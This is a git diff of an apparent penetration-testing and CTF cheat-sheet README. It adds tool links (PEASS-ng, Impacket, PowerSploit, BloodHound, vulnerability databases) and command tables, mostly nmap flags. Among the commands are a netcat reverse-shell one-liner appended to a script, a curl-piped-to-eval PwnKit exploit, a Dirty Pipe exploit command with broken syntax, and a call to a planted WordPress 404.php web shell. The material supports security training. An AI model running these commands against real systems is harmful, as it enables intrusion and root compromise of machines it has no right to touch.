@@ -5,45 +5,45 @@
 ### DNS
  - [Dnscan](https://github.com/rbsec/dnscan) - Dnscan is a python wordlist-based DNS subdomain scanner
 
-### Port scanner
+### Port Scanner
  - [Nmap](https://github.com/nmap/nmap) - The Network Mapper
  - [Zmap](https://github.com/zmap/zmap) - ZMap is a fast single packet network scanner designed for Internet-wide network surveys
  - [Rustscan](https://github.com/RustScan/RustScan) - The modern port scanner
 
-### Brute force urls
+### Brute Force Urls
  - [gobuster](https://github.com/OJ/gobuster) - Directory/File, DNS and VHost busting tool written in Go
 
-### Passive subdomains enumeration
+### Passive Subdomains Enumeration
  - [VirusTotal](https://www.virustotal.com/gui/home/upload) - Analyze suspicious files, domains, IPs and URLs to detect malware and other breaches
  - [Censys](https://censys.io/) - Censys continually scans the public IPv4 address space on 3,552+
  - [Crt.sh](https://crt.sh/) - Certificate search tool
  - [Sublist3r](https://github.com/aboul3la/Sublist3r) - Fast subdomains enumeration tool for penetration testers
  
 
-## Active subdomains enumeration
+## Active Subdomains Enumeration
  - [HackerTarget](https://hackertarget.com/zone-transfer/) - From attack surface discovery to vulnerability identification, actionable network intelligence for IT & security operations.
  - [Gobuster](https://hackertarget.com/zone-transfer/) - Directory/File, DNS and VHost busting tool written in Go
  - [Omnisint](sonar.omnisint.io) - Rapid7's DNS Database easily searchable via a lightening fast API, with domains available in milliseconds
 
-### Passive infrastructure identification
+### Passive Infrastructure Identification
  - [Netcraft](https://www.netcraft.com/) - Find out the technologies and infrastructure of any site
  - [WayBackMachine](http://web.archive.org/) - Digital archive of the World Wide Web
  - [WayBackURLs](https://github.com/tomnomnom/waybackurls) - Fetch all the URLs that the Wayback Machine knows about for a domain
 
-### Active infrastructure identification
+### Active Infrastructure Identification
  - [Whatweb](https://github.com/urbanadventurer/WhatWeb) - Next generation web scanner
  - [Aquatone](https://github.com/michenriksen/aquatone) - A Tool for Domain Flyovers
  - [Wafw00f](https://github.com/EnableSecurity/wafw00f) - Identify and fingerprint Web Application Firewall products protecting a website.
  - [Wappalyzer](https://www.wappalyzer.com/) - Technology profiler, find out what websites are built with
 
-### Web server scanner / Vulnerability scanner
+### Web Server Scanner / Vulnerability Scanner
  - [OpenVAS](https://www.openvas.org/) - Powerful open source vulnerability scanner
  - [Nikto](https://github.com/sullo/nikto) - Web server scanner
  - [WPscan](https://github.com/wpscanteam/wpscan) - WPScan WordPress security scanner
  - [Cmsmap](https://github.com/Dionach/CMSmap) - CMSmap is a python open source CMS scanner that automates the process of detecting security flaws of the most popular CMSs.
  - [Raccoon]() - 
 
-### XSS scanner
+### XSS Scanner
  - [XSStrike](https://github.com/s0md3v/XSStrike) - Most advanced XSS scanner
  - [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS) - BruteXSS is a tool written in python simply to find XSS vulnerabilities
  - [Xsser](https://github.com/epsylon/xsser) - Cross Site "Scripter" (aka XSSer) is an automatic -framework- to detect, exploit and report XSS vulnerabilities in web-based applications
@@ -58,11 +58,12 @@
 ### SNMP
  - [Onesixtyone](https://github.com/trailofbits/onesixtyone) - Fast SNMP Scanner
 
- ### Privilege escalation
+ ### Privilege Escalation
  - [LinEnum](https://github.com/rebootuser/LinEnum) - Scripted Local Linux Enumeration & Privilege Escalation Checks
  - [Pwnkit pkexec](https://github.com/berdav/CVE-2021-4034) - CVE-2021-4034 1day
+ - [PEASS-ng](https://github.com/carlospolop/PEASS-ng) - Privilege Escalation Awesome Scripts SUITE (with colors)
 
-### Passeword cracking 
+### Passeword Cracking 
  - [Hashcat](https://github.com/hashcat/hashcat) - World's fastest and most advanced password recovery utility
 
 ### Wordlists
@@ -78,7 +79,7 @@
  - [Beautifier](https://beautifier.io/) - Improves the presentation of programming source code
  - [Jsnice](http://www.jsnice.org/) - Make even obfuscated JavaScript code readable
 
-### Payloads lists
+### Payloads Lists
  - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - A list of useful payloads and bypass for Web Application Security and Pentest/CTF
  - [Xss payloads list](https://github.com/payloadbox/xss-payload-list) - Cross Site Scripting ( XSS ) Vulnerability Payload List
 
@@ -107,19 +108,42 @@
  - [Slowrx](https://github.com/windytan/slowrx) - A decoder for Slow-Scanning Television (SSTV)
  - [Robot36](https://github.com/xdsopl/robot36.git) - Encode and decode images using SSTV in Robot 36 mode
 
-### Reverse engineering
+### Reverse Engineering
  - [Ida](https://hex-rays.com/ida-free/) - binary code analysis tool for reverse engineering
+
+### Windows
+ - [Impacket](https://github.com/SecureAuthCorp/impacket) - Impacket is a collection of Python classes for working with network protocols
+ - [Sysinternals](https://docs.microsoft.com/en-us/sysinternals) - Manage, troubleshoot and diagnose your Windows systems and applications
+ - [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) - A PowerShell Post-Exploitation Framework
+ - [BloodHound](https://github.com/BloodHoundAD/BloodHound) - BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment
+
+### Code Analysis
+ - [GitGuardian](https://www.gitguardian.com) - GitGuardian is the code security platform for the DevOps generation
+ - [Synk](https://snyk.io/) - Find and automatically fix vulnerabilities in your code
+
+### Vulnerabiliy Databases
+ - [Mitre](https://cve.mitre.org/) - The mission of the CVE® Program is to identify, define, and catalog publicly disclosed cybersecurity vulnerabilities
+ - [ExploitDB](https://www.exploit-db.com/) - Search Exploit Database for Exploits, Papers, and Shellcode
+ - [Vulndb](https://cve.mitre.org/) - Number one vulnerability database documenting and explaining security vulnerabilities, threats, and exploits since 1970
+ - [CVE-details](https://www.cvedetails.com/) - Free CVE security vulnerability database/information source
+ - [NVD-Nist](https://nvd.nist.gov/) - The NVD is the U.S. government repository of standards based vulnerability management data represented using the Security Content Automation Protocol (SCAP)
 
 ## Sheetcheat
 
-### Service Scanning
+### Ports And Service Scanning
 | Description        | Command      |
 | ------ | ----- |
-| Show our IP address | ``ifconfig/ip a`` |
+| Show our IP address | ``ifconfig/ip a `` |
+| Check if a host is up | `` sudo nmap 10.129.2.18 -sn -oA host `` |
 | Run nmap on an IP | `` nmap 10.10.10.40 `` |
-| Run an nmap script scan on an IP | `` nmap -sV -sC -p- 10.10.10.40 `` |
+| Scan network range | `` sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5 `` |
+| Run an nmap script scan on an IP | `` nmap -sV -sC -p- -v 10.10.10.40 `` |
 | Run an nmap script scan for upd with Os detection | `` nmap -sUV -T4 10.10.10.40 `` |
+| Run an nmap script scan for top 100 udp ports | `` sudo nmap -F -sU 10.10.10.10 `` |
 | Run a faster nmap script scan for upd |  `` nmap -sUV -T4 -F --version-intensity 0 10.10.10.40 `` |
+| Run an nmap script on top 10 ports| `` sudo nmap 10.10.10.10 --top-ports=10 `` |
+| Track packets with SYN flags on port 21| `` sudo nmap 10.10.10.10 -p 21 --packet-trace -Pn -n --disable-arp-ping `` |
+| Track packets on a previously filtered port | `` sudo nmap 10.10.10.10 -p 139 --packet-trace -n --disable-arp-ping -Pn `` |
 | List various available nmap scripts | `` locate scripts/citrix `` |
 | Run an nmap script on an IP | `` nmap --script smb-os-discovery.nse -p445 10.10.10.40 `` |
 | Grab banner of an open port | `` netcat 10.10.10.40 22 `` |
@@ -141,7 +165,7 @@
 | Disables ARP Ping Requests | `` --disable-arp-ping `` |
 | Scans the specified top ports that have been defined as most frequent | `` --top-ports=<num> ``|
 | Scan all ports | `` -p- `` |
-| Scan all ports between 22 and 110 |`` -p22-110 `` s|
+| Scan all ports between 22 and 110 |`` -p22-110 `` |
 | Scans only the specified ports 22 and 25 | `` -p22,25 `` |
 | Scans top 100 ports | `` -F `` |
 | Performs an TCP SYN-Scan | `` -sS `` |
@@ -157,6 +181,7 @@
 | Specifies the source IP address for the scan | `` -S 10.10.10.200	`` |
 | Specifies the source port for the scan | `` -g `` |
 | DNS resolution is performed by using a specified name server | `` --dns-server <ns> `` |
+| DNS resolution for all target |  `` -R `` |
 
 ### Nmap Output Options
 | Description        | Command      |
@@ -319,7 +344,7 @@
 | SSH to the server with the generated private key | `` ssh root@10.10.10.10 -i key	`` |
 | Add a reverse shell at the end of file | `` echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.14.2 8443 >/tmp/f' \| tee -a monitor.sh ``|
 | Single script pwnkit pkexec CVE-2021-4034 | `` eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)" `` |
-
+| Dirty pipe CVE-2022-0847 | ``  git clone https://github.com/imfiver/CVE-2022-0847.git && cd CVE-2022-0847 && chmod +x && Dirty-Pipe.sh && bash Dirty-Pipe.sh `` |
 
 ### Transferring Files
 | Description        | Command      |
@@ -375,6 +400,13 @@
 | XML-RPC: Connect with credentials | `` curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>user</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://example.com/xmlrpc.php `` |
 | WPscan enumeration | `` wpscan --url http://example.com --enumerate --api-token TOKEN `` |
 | WPscan brute force login with XML-RPC |  `` wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://example.com ``|
+| Get reverse shell in malicious 404 | `` curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id" `` |
+
+### Windows
+| Description        | Command      |
+| ------ | ----- |
+| Windows version | `` Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber `` |
+| Start python http server | `` python3 -m http.server 8000 `` |
 
 ### Misc
 | Description        | Command      |
